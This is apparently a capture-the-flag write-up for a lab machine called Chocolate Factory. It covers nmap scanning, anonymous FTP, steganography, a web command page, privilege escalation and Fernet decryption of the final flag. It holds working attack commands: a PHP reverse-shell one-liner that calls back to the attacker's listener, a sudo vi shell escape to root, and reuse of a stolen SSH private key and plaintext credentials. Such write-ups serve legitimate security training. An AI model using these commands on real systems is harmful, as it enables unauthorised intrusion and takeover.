#### 1. Scanning 

```
nmap -Pn -A 10.10.242.241

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-19 06:14 EST
Nmap scan report for 10.10.242.241
Host is up (0.35s latency).
Not shown: 989 closed ports
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.46.150
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
|_auth-owners: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
100/tcp open  newacct?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
109/tcp open  pop2?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
110/tcp open  pop3?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
111/tcp open  rpcbind?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL, RPCCheck: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
113/tcp open  ident?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RTSPRequest: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
119/tcp open  nntp?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
125/tcp open  locus-map?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
```

Open ports are:
- FTP 21 with already visible file there
-22
-80
-100,106,109,111,113,119,125

Thank you Gordon Lyon for creating nmap, because it found a clue itself:
```
113/tcp open  ident?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RTSPRequest: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
```

#### 2. Accessing  http://localhost/key_rev_key

I open a link, download a file and check what it is with `strings key_rev_key `:


```
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
__stack_chk_fail
printf
__cxa_finalize
strcmp
__libc_start_main
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
5j	 
%l	 
%j	 
%b	 
%Z	 
%R	 
%J	 
%b	 
=9	 
AWAVI
AUATL
[]A\A]A^A_
Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'-VkgXhFf6***************BXeQuvhcGSQzY='
 Keep its safe
Bad name!
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
```

Bingo, I found a key, so first flag is done.


#### 3. FTP

I access FTP, get a .jpg file, check it with steghide and extract a .txt file, however in the end it seems to be a rabbit hole:)

```
 ftp 10.10.242.241

Connected to 10.10.242.241.
220 (vsFTPd 3.0.3)
Name (10.10.242.241:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
226 Transfer complete.
208838 bytes received in 0.83 secs (245.2769 kB/s)
ftp> 
```

```
steghide info gum_room.jpg 
"gum_room.jpg":
  format: jpeg
  capacity: 10.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "b64.txt":
    size: 2.5 KB
    encrypted: rijndael-128, cbc
    compressed: yes
```                                       



#### 5. Gobuster

In the meantime, I run gobuster which gives me a secret website `/home.php` with a field to type in commands.

Usually, this could be a chance to get a rev shell so I run netcat `sudo nc -lvnp 4444` and afterwards type a oneliner:

`php -r '$sock=fsockopen("10.6.46.150",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

Which gives me shell as `www-data`




#### 6. Enumeration

As `www-data` I typed `sudo -l` but he has no special permissions, however there are plenty of files in `/Var/www/html`:

```
www-data@chocolate-factory:/var/www/html$ ls -al
ls -al
total 1152
drwxr-xr-x 2 root    root       4096 Oct  6 16:50 .
drwxr-xr-x 3 root    root       4096 Sep 29 17:27 ..
-rw------- 1 root    root      12288 Oct  1 05:53 .swp
-rw-rw-r-- 1 charlie charley   65719 Sep 30 08:45 home.jpg
-rw-rw-r-- 1 charlie charley     695 Sep 30 08:45 home.php
-rw-rw-r-- 1 charlie charley 1060347 Sep 30 08:32 image.png
-rw-rw-r-- 1 charlie charley    1466 Oct  1 08:35 index.html
-rw-rw-r-- 1 charlie charley     273 Sep 29 17:21 index.php.bak
-rw-r--r-- 1 charlie charley    8496 Sep 30 09:29 key_rev_key
-rw-rw-r-- 1 charlie charley     303 Sep 30 08:46 validate.php
```

`validate.php` seems to be interesting so I `cat` it and we have a second flag:

```
www-data@chocolate-factory:/var/www/html$ cat validate.php
cat validate.php
<?php
	$uname=$_POST['uname'];
	$password=$_POST['password'];
	if($uname=="charlie" && $password=="cn7824"){
		echo "<script>window.location='home.php'</script>";
	}
	else{
		echo "<script>alert('Incorrect Credentials');</script>";
		echo "<script>window.location='index.html'</script>";
	}
?>www-data@chocolate-factory:/var/www/html$ 
```


#### 7. Switching to `charlie`


In /home/charlie there are two files teleport / teleport.pub which turn out to be private and public ssh key. 
I copy both to my local machine, name as id_rsa  (private) id_rsa.pub (public) and also give permissions `chmod 600`

Afterwards, having charlie's ssh keys, I can login successfully as him to the machine:

`sudo ssh -i id_rsa charlie@10.10.242.241`



#### 8. Escalation from charlie to root

Firstly, I check what commands can charlie exeecute as root:

```
harlie@chocolate-factory:/$ whoami
charlie

charlie@chocolate-factory:/$ id
uid=1000(charlie) gid=1000(charley) groups=1000(charley),0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

charlie@chocolate-factory:/$ sudo -l
Matching Defaults entries for charlie on chocolate-factory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on chocolate-factory:
    (ALL : !root) NOPASSWD: /usr/bin/vi
charlie@chocolate-factory:/$ 
```

There are two ways to become root: using vim - easy way or lxd containers - harder way. I am lazy so choose vim method.

According to GTFO bins:

`sudo -u root /usr/bin/vi -c ':!/bin/sh' /dev/null`

I succeed and bingo:

```
# whoami
root
```

There are many files in root's home including python script root.py:

```
# cd /root

# ls -al
total 40
drwx------  6 root    root    4096 Oct  7 16:21 .
drwxr-xr-x 24 root    root    4096 Sep  1 17:10 ..
-rw-------  1 root    root       0 Oct  7 16:21 .bash_history
-rw-r--r--  1 root    root    3106 Apr  9  2018 .bashrc
drwx------  3 root    root    4096 Oct  1 12:07 .cache
drwx------  3 root    root    4096 Sep 30 17:01 .gnupg
drwxr-xr-x  3 root    root    4096 Sep 29 11:28 .local
-rw-r--r--  1 root    root     148 Aug 17  2015 .profile
-rwxr-xr-x  1 charlie charley  491 Oct  1 11:45 root.py
-rw-r--r--  1 root    root      66 Sep 30 10:03 .selected_editor
drwx------  2 root    root    4096 Sep  1 17:17 .ssh
```

Which needs to be launched in order to get a final flag (very smart)


#### 9. Getting root flag and running root.py

I check what is inside that script:

```
root@chocolate-factory:/root# cat root.py 

from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
```

So there is a message encrypted with a symmetric method called Fernet. To decrypt it, we also need a key, which we found in the beginning!

After quick googling I find Fernet decoder:

`https://asecuritysite.com/encryption/ferdecode`

then type in the key `-VkgXhFf6sAEc*********************vhcGSQzY=` and copy decrypted message from a script to get root's flag after a while:

```
Decoded:	flag{cec5916**************6b42124}
```

That was great. I learnt how to get reverse shell with php oneliner and that nmap is a very powerful tool which must be always used first cause helps a lot.

